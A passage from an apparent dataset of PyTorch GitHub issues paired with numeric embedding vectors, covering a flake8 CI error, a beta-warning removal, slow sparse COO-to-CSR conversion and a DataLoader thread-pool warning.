 -1.24921374e-01 -5.20198718e-02 -4.53312024e-02 -4.59688097e-01
 -5.96689396e-02 -1.09931730e-01  6.24801219e-02 -2.95299828e-01
 -1.91309914e-01  3.06621850e-01 -2.59496011e-02 -2.72031575e-01
 -1.12052605e-01 -1.52343839e-01  5.58932349e-02 -2.65270352e-01
 -1.81498647e-01 -2.21028164e-01  4.17391062e-01  1.87852547e-01
  1.51993826e-01  1.31069934e-02 -1.04863077e-01  7.26874918e-02
 -7.94193894e-02  2.69052327e-01  2.17947453e-01  4.34040487e-01
  1.48261935e-01  1.24055028e-01 -1.49451807e-01  5.13537049e-01
 -2.36470059e-01 -1.36009097e-01 -4.04442012e-01 -2.62321271e-02
  8.45157206e-02 -2.28874132e-01 -5.81880957e-02 -2.86565006e-01
  2.20246106e-01  3.66656959e-01  6.59352243e-02  3.07594001e-01
  4.93598208e-02  6.57156110e-01  4.22282636e-01 -2.29924262e-01
 -5.30913472e-04  1.02563333e-02  1.04477674e-01 -1.67966425e-01
  2.91092455e-01  1.44006699e-01 -9.00641829e-02  4.80742007e-03]"
Flake8 triggers E902 FileNotFoundError: [Errno 2] No such file or directory module: ci triaged,"## ðŸ› Bug
Per title
PR is blocked due to the test.

## To Reproduce

1. Remove any file
1. run `make quicklint -j 6` or `python tools/actions_local_runner.py --file-filter '.py' --changed-only --job 'flake8-py3'`
1. `E902 FileNotFoundError: [Errno 2] No such file or directory`

## Expected behavior

No error and CI is green

I think we need to filter out the deleted file from here:
https://github.com/pytorch/pytorch/blob/098d9975a7c6b33ada382bd51f322f7f5c694a17/tools/actions_local_runner.py#L62-L82


cc @ezyang @seemethere @malfet @walterddr @pytorch/pytorch-dev-infra",True,"[-2.59066820e-01 -3.50743532e-01 -2.09961921e-01  1.01985194e-01
  4.59576458e-01 -2.91456699e-01  1.85245216e-01  4.03585061e-02
 -2.01483876e-01 -2.46365592e-01  6.27803355e-02 -4.64457422e-02
 -2.41338070e-02 -6.31075650e-02 -5.09624742e-03 -8.22455436e-02
 -1.23340070e-01 -3.25703800e-01  1.85483277e-01 -2.18122937e-02
  8.22208375e-02  1.43902913e-01 -8.94617662e-02 -1.67708337e-01
 -1.30173817e-01  8.91528577e-02 -5.94309717e-02  7.10069388e-02
  5.16675971e-03 -5.70192002e-03  4.36982870e-01 -2.77626980e-02
 -4.03009593e-01  1.40531406e-01  3.95109743e-01  4.49773818e-02
 -5.38000762e-01 -5.12532145e-02 -4.03983742e-02 -1.42290384e-01
 -8.40083063e-02 -1.11250475e-01 -2.03293003e-02  9.92788747e-02
 -3.59786768e-03  2.56324578e-02 -7.07735196e-02  2.76191622e-01
 -1.25869334e-01 -1.25766516e-01  1.67676136e-02 -2.22727045e-01
 -1.09114096e-01 -2.56643265e-01  2.42370993e-01 -1.42962784e-01
 -2.53992975e-01  4.84523237e-01  7.99016356e-02 -4.16483916e-03
 -3.10128853e-02 -2.21953597e-02 -1.52350977e-01 -2.34046519e-01
 -1.03975415e-01  7.07437247e-02  8.09512287e-02  3.90950032e-02
  4.64584500e-01  3.50907594e-02 -1.69990361e-01  5.88933714e-02
 -5.44645600e-02  4.09948640e-02  1.98403090e-01  2.69876897e-01
 -4.30022240e-01  1.70428246e-01 -1.24849394e-01 -1.31773800e-01
 -1.24484055e-01 -1.71096623e-01 -1.48372464e-02  3.47671658e-02
  1.43701464e-01  7.75146261e-02  1.84978008e-01 -2.58225501e-01
  3.10245097e-01  3.03301722e-01  3.32371652e-01  2.49827206e-01
  2.72020817e-01  3.85616153e-01 -3.32678378e-01  2.90736616e-01
  9.28428918e-02  6.97610527e-02 -2.14537695e-01  8.17001462e-02
  1.75614387e-01 -2.97312200e-01  6.10764101e-02  3.78809661e-01
  9.32412595e-02 -1.66707769e-01  4.14559454e-01  1.36804909e-01
 -1.29648507e-01 -1.93485796e-01  1.12018436e-01 -2.04339474e-01
  2.23391235e-01 -5.19788042e-02  1.67376339e-01 -1.71458982e-02
 -1.36194527e-01  8.63615274e-02 -1.98166072e-01  6.72183037e-02
  5.95815480e-02  2.44597897e-01 -1.71543881e-01 -1.77177176e-01
  3.80088091e-02  9.28688049e-02 -5.06755859e-02 -1.68873027e-01
  1.72313005e-01  1.21567287e-01 -2.50476420e-01  5.05704507e-02
 -2.53542960e-01 -9.61958617e-02 -1.27880856e-01  2.99981087e-01
 -1.08209386e-01 -1.72451854e-01  3.11582118e-01 -3.00939322e-01
 -9.41927880e-02 -4.54086959e-01  1.21678263e-01 -2.25062951e-01
  1.43542632e-01  8.21542591e-02 -1.28201559e-01  2.09067822e-01
 -1.24234125e-01 -1.01655379e-01 -1.71691388e-01  7.62519464e-02
 -4.50691462e-01  5.12652397e-01 -1.13655761e-01  5.72823361e-02
  6.14663005e-01  2.16590345e-01  2.68465638e-01 -1.36440232e-01
 -1.28277108e-01  2.23364532e-01 -1.57709777e-01 -3.10617238e-01
 -3.52606773e-02 -8.92992839e-02 -2.42523283e-01  2.95159101e-01
 -2.11702853e-01 -9.82277617e-02 -1.35532901e-01  6.10896340e-03
  1.22823596e-01 -1.63495064e-01  1.72165498e-01  2.08078966e-01
  1.69710770e-01 -2.18941286e-01  2.14026570e-01  2.46148705e-01
  2.21765116e-01  4.57415581e-01 -6.16875961e-02  1.63234860e-01
 -2.39968300e-01  8.78872871e-02  3.89070883e-02 -2.42920518e-01
 -2.67309733e-02  1.14876844e-01 -1.49345204e-01 -1.70403004e-01
  2.02350706e-01 -1.15461424e-01 -3.67975794e-02  5.68841211e-02
 -4.55908775e-02  2.12075949e-01  1.21950759e-02  8.21753964e-02
  8.27614963e-02  3.41099948e-01 -8.86845365e-02 -2.00009122e-01
  2.78809726e-01  1.93917841e-01 -2.13259220e-01 -2.29017615e-01
 -8.23765248e-02 -1.32511422e-01 -8.10466409e-02 -1.48070529e-01
 -5.93261532e-02 -2.34738410e-01 -9.15370733e-02  6.70594350e-02
  1.47409707e-01 -3.47035646e-01  2.73727179e-01 -7.89151862e-02
 -1.47595689e-01 -6.42898157e-02 -6.14200644e-02 -2.35204667e-01
  3.46486598e-01  1.36797670e-02 -7.40373284e-02  3.59471887e-04
 -1.80943325e-01  3.03519577e-01  6.00380898e-02 -4.24648106e-01
  4.71566886e-01  4.83185798e-03 -1.41849190e-01 -5.94803691e-03
 -1.46686463e-02 -1.33911580e-01 -4.13726792e-02  3.84829819e-01
 -8.42064396e-02 -1.25563562e-01 -2.26110041e-01 -5.81892282e-02
  1.90296918e-02 -1.80275902e-01 -2.16752738e-02  1.13366209e-01
 -3.84609848e-01  3.38543579e-02  2.85005011e-03  1.28515810e-01
  1.13438532e-01  4.01090592e-01  5.37751555e-01  2.90187865e-01
 -1.78874686e-01  9.40702409e-02 -2.97641546e-01 -4.80008461e-02
  7.31755644e-02  2.58172512e-01  1.07736260e-01  3.41944367e-01
  6.23256750e-02 -2.62313783e-01 -3.48601878e-01  2.86274612e-01
  6.14376217e-02  1.56870671e-02  7.79640973e-02 -3.99080217e-01
  1.78715110e-01 -2.18026675e-02  1.14837445e-01  3.90753634e-02
  4.22528386e-01  2.69630998e-02  3.30499113e-02 -3.20555031e-01
  1.09139476e-02  2.66723223e-02 -5.66646233e-02 -3.35402833e-03
  5.07377505e-01  2.25727946e-01 -2.16296285e-01 -8.11491758e-02
 -2.75712550e-01  8.44461620e-02  2.24440657e-02  1.97271645e-01
  2.44932413e-01 -6.67231530e-03 -2.85139978e-01 -2.00249925e-02
 -1.38772830e-01 -1.81966752e-01 -5.21472767e-02  2.87499368e-01
 -7.55405873e-02  1.25376612e-01  1.04527557e-02  1.39537990e-01
  1.91154703e-03 -7.24364519e-02 -1.47058561e-01 -2.53038913e-01
  1.50073975e-01 -1.83220565e-01  4.89791334e-02  5.86577713e-01
  7.14032445e-03  1.32503301e-01 -1.54265255e-01  5.82931414e-02
  7.43119270e-02  3.16128045e-01  2.43219346e-01 -1.81007400e-01
  1.12222180e-01 -1.28349960e-01  1.26130462e-01 -5.09732356e-03
  1.28323108e-01  2.25428566e-01 -4.92595136e-01  2.92962547e-02
 -1.82617649e-01 -1.15085408e-01 -3.10977399e-02  6.85207844e-02
 -1.13833562e-01  2.13755369e-01 -8.18314105e-02 -1.79460973e-01
 -3.85835990e-02  3.66980731e-01 -2.13113010e-01 -2.02952743e-01
 -2.03529205e-02 -1.47606567e-01  2.09536940e-01 -5.75929165e-01
 -1.07108802e-01 -2.02190280e-01  1.73707008e-01  1.60747916e-01
 -2.92060137e-01 -1.85080230e-01 -1.77677393e-01 -3.12770665e-01
 -1.51006430e-01  2.56971121e-02 -1.16373740e-01  5.84791541e-01
  3.53033245e-02 -1.34348068e-02 -1.07121706e-01  3.62810075e-01
 -1.63091749e-01  2.96641216e-02 -2.30175465e-01 -1.28680214e-01
 -2.19815657e-01 -2.32689887e-01 -8.81949589e-02 -2.70442404e-02
  2.87301809e-01  4.93772477e-02 -1.94019303e-01  1.15431741e-01
 -2.63304204e-01  4.60622549e-01  1.76519290e-01  1.27301261e-01
  2.14415714e-01  2.93465704e-01 -1.15654930e-01  3.41049582e-02
 -2.18735188e-01  3.61235142e-01  2.04951614e-01  8.69902074e-02]"
Remove beta warning for `use_deterministic_algorithms` triaged module: determinism,"Since `use_deterministic_algorithms` is stable for 1.9, we can remove beta warnings.

cc @mruberry @kurtamohler",True,"[-2.62072355e-01  4.96204244e-04  2.01316327e-01 -4.70107645e-01
  6.52944684e-01  3.28801423e-02  2.72578835e-01 -1.18383422e-01
 -3.65658879e-01 -4.86581102e-02  3.54372859e-01  1.58215627e-01
  1.13093548e-01 -9.73263383e-02 -7.71846771e-02  2.54280306e-02
 -1.00001760e-01  5.97623810e-02  2.10199386e-01 -6.24077842e-02
  8.23792070e-02 -9.62085873e-02 -3.20735157e-01  2.24642068e-01
 -1.03954583e-01 -1.30193189e-01 -7.88386017e-02  3.91769707e-02
  3.48543555e-01  1.30869344e-01  2.73084313e-01  5.85299060e-02
  1.21231683e-01 -3.44415419e-02  1.96095213e-01 -1.83381289e-01
 -1.71555907e-01  7.37663433e-02 -1.20466724e-02  2.19421580e-01
  1.10775962e-01 -3.24827433e-01 -1.28853589e-01 -6.13616407e-02
 -1.49117887e-01 -1.17502108e-01 -2.25249231e-01  8.97462294e-02
 -2.01626286e-01 -1.25006318e-01  9.86201912e-02  2.54307278e-02
  2.02833954e-03 -5.19544303e-01  1.81651220e-01 -5.20228803e-01
 -2.70985160e-03 -9.10114571e-02 -2.15801209e-01  1.66966561e-02
  4.80577201e-01 -1.03359185e-01 -2.07632467e-01 -8.68157446e-02
  8.97022337e-02  2.09851742e-01  1.34459525e-01  1.84203401e-01
  5.81870615e-01  7.02709496e-01  2.53766507e-01  6.69512805e-03
 -4.11586165e-01  1.76313505e-01 -6.68093935e-02  8.36173818e-02
 -8.90807137e-02 -6.06058165e-02  1.35021880e-01  6.69866577e-02
 -2.02041015e-01 -1.42402142e-01  3.62307131e-02 -4.62997019e-01
 -3.29088360e-01 -6.17603734e-02  2.08208025e-01 -2.85337470e-03
  4.92001086e-01 -1.54182687e-01  1.57758832e-01 -1.24011092e-01
  1.85365960e-01  1.08057093e-02 -1.82505801e-01  8.65188986e-02
 -1.25860915e-01 -2.63895601e-01 -4.30749387e-01  2.12496623e-01
 -3.04328781e-02 -2.02893410e-02 -3.08452427e-01  1.47369489e-01
 -1.99646115e-01 -7.53906742e-02  2.60387957e-01 -5.71655966e-02
  7.25432336e-02 -2.78791785e-01 -1.97058305e-01 -2.39784732e-01
  3.17906886e-01  2.78727245e-02 -1.47590369e-01 -1.72729269e-01
  2.45038494e-01  2.81088084e-01 -5.60787730e-02  3.21171880e-01
  2.29060620e-01 -2.06949875e-01  3.15004885e-01  3.27843249e-01
  4.38581407e-01  1.46388188e-01 -1.66419119e-01 -4.10283729e-03
  1.24673858e-01 -5.84825240e-02  1.25880212e-01 -1.90302029e-01
  1.15718655e-01  3.27802524e-02  2.16611512e-02  7.74898846e-03
 -6.65211827e-02 -5.65918200e-02  2.56265759e-01  1.69422418e-01
 -4.96831954e-01  2.82792807e-01 -1.06185235e-01 -9.06579420e-02
  4.38410014e-01  2.29862332e-01  1.43414289e-01 -5.34034260e-02
  1.03727609e-01 -4.32603478e-01 -3.12774517e-02 -5.48244193e-02
 -3.33512463e-02  2.15577304e-01 -4.62937206e-02  3.05150867e-01
  5.60755134e-01  2.91882664e-01  9.00363550e-02 -1.35245889e-01
  8.50891173e-02  4.38237935e-01  2.85047978e-01 -2.78975159e-01
  5.46607114e-02  1.26439363e-01 -1.53852180e-01 -2.17012521e-02
  1.52009100e-01  2.91344702e-01 -2.83548795e-02 -1.86541557e-01
  9.10281029e-04 -2.22078636e-01  2.73968607e-01 -2.81961858e-01
  1.22654706e-01 -3.73061329e-01  2.68098533e-01  3.26914966e-01
 -4.80338156e-01 -1.67887613e-01  1.09759346e-01  4.66734082e-01
 -2.03544497e-02  1.65229931e-01  1.88268855e-01 -9.08443853e-02
 -2.89293498e-01 -9.57510397e-02 -4.44953628e-02 -6.17056966e-01
  2.59971976e-01  1.49507940e-01 -7.42709637e-02 -2.69034624e-01
  9.85122398e-02  1.32008970e-01 -2.53664225e-01 -3.39330398e-02
 -2.09271431e-01  2.89845075e-02 -1.89909860e-01 -3.87045704e-02
  1.09145291e-01 -8.13950822e-02  2.03879818e-01 -5.27218282e-01
 -2.68570393e-01  3.25877853e-02 -8.13231170e-02  1.02825306e-01
  1.39516532e-01 -4.05644298e-01 -3.49962041e-02  2.00709447e-01
 -2.06163868e-01 -1.27500758e-01  4.37654287e-01  3.47190619e-01
  8.36282223e-02  8.77510384e-03 -4.56068397e-01  1.20039470e-02
 -5.74711680e-01 -3.73309165e-01 -2.29514629e-01 -1.58432782e-01
 -9.77776721e-02  1.63420320e-01 -3.09898376e-01  1.08654834e-01
  8.13189223e-02 -1.40796527e-01  2.87315011e-01 -8.15795586e-02
  1.57133918e-02 -3.14732902e-02 -2.26293370e-01  1.37016654e-01
 -1.45245418e-01  1.92509461e-02 -1.93623826e-01  9.26757529e-02
  7.28279874e-02  2.08122507e-01 -4.65465128e-01 -1.09230191e-01
 -1.93139806e-01 -9.64442641e-02 -2.21399859e-01 -3.02807498e-03
  1.55426130e-01  2.82510500e-02 -1.16024986e-01  2.63112396e-01
 -3.45535725e-01  3.37813407e-01  1.28244773e-01 -2.24367648e-01
  4.87050079e-02  2.22975984e-02  7.16546699e-02  1.34829581e-01
  1.26756117e-01  1.47835836e-01 -3.91879618e-01 -1.19906388e-01
  1.02643453e-01 -2.50771493e-01  1.20455250e-01 -3.67730409e-01
  3.59529704e-01 -1.08361356e-01  1.50682643e-01 -2.36209109e-02
  3.78963113e-01 -8.41740742e-02 -3.18513870e-01 -4.81870502e-01
 -2.00522527e-01  8.55399221e-02  8.26915279e-02  1.02987491e-01
 -6.62154779e-02 -1.76033840e-01 -2.03189477e-01  5.92417903e-02
 -1.55158147e-01 -1.60014182e-01 -3.22058916e-01  2.67336220e-01
  2.98013091e-01 -1.56018674e-01  1.26780152e-01  1.43516570e-01
 -1.82618394e-01 -1.37845501e-01 -1.46384418e-01 -1.26033604e-01
 -2.14013278e-01 -8.86139795e-02  2.96553344e-01 -1.99281350e-01
 -1.24201268e-01  1.34162650e-01 -5.74937277e-02 -7.24956021e-02
  2.42363930e-01 -2.57320970e-01  1.63450778e-01  3.21309149e-01
  2.04352081e-01  6.91885278e-02  1.53705344e-01 -5.93808219e-02
 -3.45199764e-01  2.87728846e-01 -7.35155568e-02  1.71946511e-01
  3.97740185e-01 -3.47400844e-01  3.63594852e-02 -2.88874637e-02
  1.92551509e-01  2.21305460e-01 -5.69675922e-01 -3.42340022e-01
  4.17283103e-02 -1.07097231e-01  3.12583894e-01  1.31100923e-01
 -2.68913001e-01  7.69768804e-02 -1.73138045e-02  5.33333346e-02
 -2.17104241e-01  2.93026000e-01  3.00105885e-02 -7.34710544e-02
 -6.50681481e-02  1.72731712e-01  7.16882646e-02 -3.00309926e-01
  9.12059769e-02  3.62683050e-02  3.03994179e-01  9.25615951e-02
 -3.63457541e-04  3.56676251e-01 -4.91674207e-02  1.26452729e-01
 -2.98411220e-01 -1.55729502e-01  4.45274919e-01  5.64927161e-01
  3.10337782e-01 -2.25767419e-02 -5.76812066e-02  8.34010169e-02
  1.75056029e-02  3.70857008e-02 -4.38499808e-01  1.65760607e-01
  1.79885224e-01 -3.08191836e-01  3.27217638e-01 -2.13800594e-01
 -7.88550451e-02 -1.42684579e-01 -2.75543094e-01 -7.64918327e-02
  4.01940383e-02  1.65278032e-01  8.20148438e-02 -1.73300296e-01
 -1.05787702e-01 -2.32777059e-01 -4.34820130e-02 -2.13330343e-01
  5.01980036e-02  1.33671820e-01  2.24154964e-02  1.67143613e-01]"
COO to CSR tensor conversion is slow module: performance module: sparse triaged enhancement open source,"Originally raised in https://github.com/pytorch/pytorch/pull/50937#discussion_r604346660

The COO to CSR tensor conversion is implemented in
https://github.com/pytorch/pytorch/blob/3a777b67926c5f02bc287b25e572c521d6d11fb0/torch/_tensor.py#L928-L940
and it consists of two time-consuming parts:
- coalescing if the COO tensor is uncoaleasced
- row indices compression procedure

Indeed, taking a coalesced COO sample with `size=(1000, 1000)` and `nnz=500`, about 1.5% of the `to_sparse_csr` call time is spend in coalescing and 98% of the time in running the row indices compression loop.

The slowness of the row indices compression loop has two origins:
- it is implemented in Python
- it uses a suboptimal algorithm

Indeed, a sample of row indices with `size[0] == 1000` and `nnz=500`, a pure Python algorithm in
https://github.com/pearu/gcs/blob/b54ba0cba9c853b797274ef26b6c42386f2cafa3/gcs/storage.py#L24-L45
is about 3x faster than used in `to_sparse_csr`, and when applying `numba.njit` to the `compress_indices` function, about 83x speedup is achieved compared to `to_sparse_csr`.

The performance of COO to CSR tensor conversion can be improved by implementing a more efficient row indices compression algorithm (see `compress_indices` referenced above) in C++.

cc @VitalyFedyunin @ngimel @aocsa @nikitaved @pearu @mruberry",True,"[-2.31206119e-01 -5.96863687e-01 -5.09935737e-01  6.94132969e-02
 -2.29246601e-01 -2.53361017e-01 -9.83546227e-02 -2.01277480e-01
 -5.34310818e-01 -3.04794639e-01  9.21509266e-02  1.16099797e-01
 -1.27129778e-01 -1.35376006e-01 -2.70147085e-01  2.00802267e-01
 -7.11873472e-02  6.37932599e-01 -1.29765600e-01 -4.97761667e-01
 -3.51400048e-01 -1.90598667e-01 -4.69836861e-01  2.08086431e-01
  2.65732557e-01 -4.00633253e-02  1.51666522e-01 -1.94905758e-01
  2.76148990e-02  2.74438679e-01  4.90434974e-01  2.02178016e-01
  7.53241852e-02 -1.16072282e-01 -4.54001784e-01  7.44968474e-01
  4.71236296e-02 -4.16096687e-01  6.65660724e-02  1.11092418e-01
 -9.42218602e-02  2.97842771e-01  1.53129563e-01  2.10500389e-01
 -2.36883208e-01  2.20536232e-01  2.29534835e-01  5.98504487e-03
 -2.62974977e-01 -2.32762992e-01 -8.40256065e-02 -2.33354047e-04
 -5.54539204e-01 -5.45315504e-01 -1.27583936e-01  5.85605018e-02
  3.45103383e-01  2.12182999e-01  6.61720261e-02 -3.54732990e-01
 -1.60464451e-01 -1.75634503e-01  2.59929359e-01  1.55817807e-01
  1.35782897e-01  3.44245508e-02  5.83980262e-01 -2.18266636e-01
  3.81585240e-01  3.51445712e-02 -1.57592788e-01 -7.26599395e-02
 -2.76007384e-01 -2.22777620e-01  1.73041075e-02 -2.17173658e-02
  1.18979059e-01  4.12873596e-01  5.18966198e-01 -1.73588976e-01
  2.84486115e-01 -1.99373364e-02 -7.89958015e-02 -9.82707143e-01
  1.38510600e-01 -2.06633806e-01  2.77464092e-01  3.41259867e-01
  2.83790857e-01 -7.50846386e-01  5.77859879e-01  2.36158557e-02
 -2.52972901e-01 -9.92583707e-02  8.11225772e-02  8.91354531e-02
  2.35238254e-01 -2.84555349e-02  2.57149071e-01 -2.83511519e-01
 -4.42205250e-01  2.25545645e-01 -6.13773227e-01  1.63739830e-01
 -2.75401205e-01 -1.21586762e-01  3.71825635e-01  2.31889322e-01
  1.56013787e-01  3.23711962e-01 -1.05309105e-02  1.14405558e-01
  5.51516041e-02  3.22280712e-02  7.54515082e-02  3.79644871e-01
  1.78867996e-01  2.29312703e-01  3.25308412e-01  7.67257273e-01
 -2.05401123e-01 -2.36005574e-01  1.11347914e-01  2.82962918e-01
  3.13772380e-01  1.39825270e-02  6.00225814e-02  1.11747801e-01
  1.27705961e-01  1.70612395e-01  2.31396616e-01 -4.27205339e-02
 -1.90920662e-03  3.35625768e-01 -3.76580715e-01 -1.10895231e-01
 -2.02730730e-01 -2.40913212e-01 -2.66705275e-01 -3.10267627e-01
 -2.94204861e-01  4.83626902e-01 -2.74587870e-01 -4.77623999e-01
  2.85630971e-01  8.56425986e-02 -1.45764649e-01 -2.89497524e-02
 -3.16418335e-02  2.75523841e-01 -2.65767813e-01  3.37312043e-01
 -1.98565982e-02  2.43982762e-01  4.83197182e-01  5.03816068e-01
  1.45072162e-01 -3.90047342e-01 -4.47383642e-01 -4.18703288e-01
  3.01620662e-01  1.19504094e-01 -1.81391343e-01 -8.44761655e-02
  9.77250189e-02  1.20076574e-01 -4.37923849e-01 -1.91070169e-01
  8.41410160e-02  2.98453569e-01 -1.68454081e-01 -2.78695285e-01
 -2.31532365e-01 -1.05570272e-01  1.09149948e-01 -2.35889956e-01
  4.03774567e-02 -5.27993798e-01 -2.07996547e-01  1.88845366e-01
 -2.20635191e-01  1.10065296e-01  4.28176343e-01 -4.78935577e-02
 -1.57248437e-01  1.59135573e-02  2.78448761e-01  2.11587220e-01
 -3.39165092e-01 -3.02848160e-01 -4.48309600e-01 -1.97781414e-01
  1.88231528e-01 -1.97807461e-01 -3.29279341e-04 -1.08664960e-01
  2.13770509e-01  3.89829315e-02 -1.31885171e-01  1.05623230e-01
 -2.51741916e-01 -3.30071241e-01  3.48770469e-01  1.35089666e-01
  3.38580728e-01 -4.60609645e-01 -2.64014304e-03 -2.90527403e-01
 -5.59032977e-01  6.99068666e-01  2.36175448e-01 -6.49654746e-01
  5.18725850e-02 -9.78387073e-02 -5.60474634e-01  4.23405707e-01
  1.28562152e-01  9.62404907e-02 -3.87619227e-01  2.65255690e-01
  2.19679639e-01 -2.37154946e-01  2.25785132e-02 -3.70426357e-01
 -2.46958658e-01 -1.78663880e-01 -8.38191211e-02  1.35375962e-01
 -2.38672778e-01  1.53514460e-01 -1.98935848e-02 -2.72371918e-02
  8.78112912e-02 -1.10941581e-01  4.75545645e-01 -3.59752476e-01
 -2.95504391e-01 -2.28157938e-01  4.53333944e-01  2.04551548e-01
 -3.49357456e-01  4.35007662e-02 -4.77951057e-02 -6.42343014e-02
  3.19639355e-01  5.55526197e-01 -2.21666604e-01 -3.90580855e-02
 -3.16557854e-01  1.24812067e-01 -5.76809943e-02 -9.54526886e-02
  1.78170845e-01  4.94958222e-01  3.54671985e-01 -4.04879004e-01
 -1.60804570e-01  1.69286773e-01 -5.22464886e-02  6.36025444e-02
  6.38185143e-01  5.21435261e-01 -1.23293415e-01  7.63663650e-01
  1.76615119e-01  7.92870164e-01 -8.51149708e-02  3.52237821e-01
 -1.88086241e-01 -2.08760858e-01  8.39457363e-02  4.79659066e-02
  3.62062715e-02 -2.97304511e-01  1.93494111e-01 -4.53524113e-01
 -1.25105873e-01 -6.14474490e-02 -3.58412445e-01  7.08343759e-02
 -6.64648637e-02  7.78309107e-02 -2.18350723e-01  2.86034495e-01
 -1.96825877e-01 -2.17027590e-01 -5.52527457e-02 -4.09213096e-01
  5.84451593e-02  3.38497400e-01 -1.54525131e-01  5.84451735e-01
  6.80189371e-01 -5.13163880e-02 -2.26199865e-01  2.40552410e-01
  2.73340702e-01  3.13083172e-01  5.67130372e-02 -4.27041858e-01
 -7.25935623e-02  1.50323510e-01  2.18118444e-01 -2.72116542e-01
 -1.58357829e-01  1.26137778e-01  2.38927811e-01  2.01843262e-01
  3.71606469e-01 -1.75732762e-01  1.10232674e-01 -1.71941578e-01
  2.92356253e-01  2.09240049e-01 -3.57413113e-01 -1.21133164e-01
  1.12829298e-01  7.31782913e-01  3.61115821e-02  2.39438340e-02
 -3.32569629e-01  4.08467613e-02 -4.49943900e-01  1.13200188e-01
  1.57767996e-01  1.53369367e-01 -1.92260519e-01 -7.51580358e-01
  3.76755521e-02 -2.13517398e-01 -3.33192885e-01 -3.73157054e-01
 -1.56465158e-01  1.02561023e-02  3.14070851e-01  2.04965621e-01
 -6.58659190e-02  4.31118123e-02  1.79019183e-01 -5.75087309e-01
 -2.69211203e-01  4.20201272e-02  3.78984690e-01  1.42548397e-01
 -1.74307674e-01 -2.86004663e-01  4.06798363e-01  6.12490952e-01
 -2.04604536e-01 -1.78432450e-01 -4.62576330e-01  3.95501852e-01
 -4.49985079e-02  5.36055192e-02  3.28201413e-01  2.32434362e-01
  1.84655219e-01  1.98445559e-01  1.94258958e-01  6.43872440e-01
 -3.02800417e-01 -9.55603421e-02 -2.64722139e-01  1.79782689e-01
  2.62931079e-01 -2.46864900e-01  1.22144017e-02 -6.21851206e-01
 -2.93774158e-02  6.17912889e-01  1.07444478e-02  5.91670752e-01
 -1.78832561e-04  3.20775867e-01  6.39370203e-01 -5.43738127e-01
 -1.15469418e-01  1.70675725e-01 -2.23394632e-01 -2.81715877e-02
 -1.78450681e-02  8.03220738e-03 -1.87177435e-01  1.32228225e-01]"
`Warning: Leaking Caffe2 thread-pool after fork` when using `DataLoader` with `num_workers>0` and `pin_memory=True` module: dataloader triaged,"## ðŸ› Bug

When using a `DataLoader` with `num_workers>0` and `pin_memory=True`, warnings trigger about `Leaking Caffe2 thread-pool after fork`. This warning shows multiple times, and populates the screen.
The warning doesn't trigger when either `num_workers=0` or `pin_memory=False`.

## To Reproduce

Steps to reproduce the behavior:

1. Run the following:
   ```python
    from torch.utils.data import DataLoader
    from torchvision.datasets import FakeData
    from torchvision.transforms import ToTensor
    
    
    def main():
        data = FakeData(transform=ToTensor())
        dataloader = DataLoader(data, num_workers=2, pin_memory=True)
        for e in range(1, 6):
            print(f'epoch {e}:')
            for _ in dataloader:
                pass
    
    
    if __name__ == '__main__':
        main()
    ```

### Output:
```
epoch 1:
epoch 2:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 3:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 4:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 5:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
```

## Expected behavior

No warnings

## Environment

```
PyTorch version: 1.9.0.dev20210428
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti
GPU 2: GeForce RTX 2080 Ti
GPU 3: GeForce RTX 2080 Ti
GPU 4: GeForce RTX 2080 Ti
GPU 5: GeForce RTX 2080 Ti
GPU 6: GeForce RTX 2080 Ti
GPU 7: GeForce RTX 2080 Ti

Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.9.0.dev20210428
[pip3] torchaudio==0.9.0a0+999026d
[pip3] torchvision==0.10.0.dev20210428
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               11.1.74              h6bb024c_0    nvidia
[conda] mkl                       2021.2.0           h06a4308_296
[conda] mkl-service               2.3.0            py38h27cfd23_1
[conda] mkl_fft                   1.3.0            py38h42c9631_2
[conda] mkl_random                1.2.1            py38ha9443f7_2
[conda] numpy                     1.20.1           py38h93e21f0_0
[conda] numpy-base                1.20.1           py38h7d8b39e_0
[conda] pytorch                   1.9.0.dev20210428 py3.8_cuda11.1_cudnn8.0.5_0    pytorch-nightly
[conda] torchaudio                0.9.0.dev20210428            py38    pytorch-nightly
[conda] torchvision               0.10.0.dev20210428      py38_cu111    pytorch-nightly
```

## Additional context

It looks like this warning was introduced in https://github.com/pytorch/pytorch/pull/54895. I don't quite follow the details there, though.

cc @SsnL @VitalyFedyunin @ejguan",True,"[-3.26792330e-01 -4.19420213e-01 -4.52197455e-02  1.88120261e-01
  2.80566037e-01 -3.81510347e-01  4.85728085e-02  4.23172534e-01
 -4.70973790e-01 -2.29293063e-01 -2.02218771e-01 -4.38350618e-01
  2.60643288e-03  2.75581479e-01 -9.24756080e-02 -1.70689642e-01
 -2.28190869e-02 -3.89425278e-01  4.50397551e-01  1.17350541e-01
  1.07797898e-01 -1.99346617e-02 -2.59204119e-01  3.89597237e-01
  4.64245453e-02  1.81115136e-01 -1.19213961e-01 -4.80002500e-02
  8.22330415e-02  2.19910964e-02 -6.54053092e-02  3.80090594e-01
 -2.77535200e-01 -3.07423234e-01  4.54488993e-01  4.06535268e-02
 -3.14789057e-01 -4.59666431e-01 -1.39743760e-02 -2.37279013e-02
